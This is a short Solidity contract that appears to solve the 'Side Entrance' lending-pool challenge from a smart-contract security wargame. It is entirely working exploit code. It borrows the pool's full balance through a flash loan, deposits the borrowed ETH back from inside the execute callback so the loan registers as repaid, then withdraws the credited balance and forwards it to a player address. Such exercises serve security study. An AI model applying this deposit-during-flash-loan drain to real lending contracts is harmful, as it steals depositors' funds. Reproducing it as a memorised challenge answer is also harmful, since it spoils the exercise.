// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract FlashLoanEtherReceiver is IFlashLoanEtherReceiver {
    SideEntranceLenderPool lenderPool;
    address player;

    constructor (SideEntranceLenderPool _lenderPool, address _player) {
        lenderPool = SideEntranceLenderPool(_lenderPool);
        player = _player;
    }

    receive() external payable {
        SafeTransferLib.safeTransferETH(player, address(this).balance);
    }

    function runFlashLoan() external {
        lenderPool.flashLoan(address(lenderPool).balance);
    }

    function execute() external override payable {
        lenderPool.deposit{value: address(this).balance}();
    }

    function pullETH() external payable{
        lenderPool.withdraw();
    }
    
}
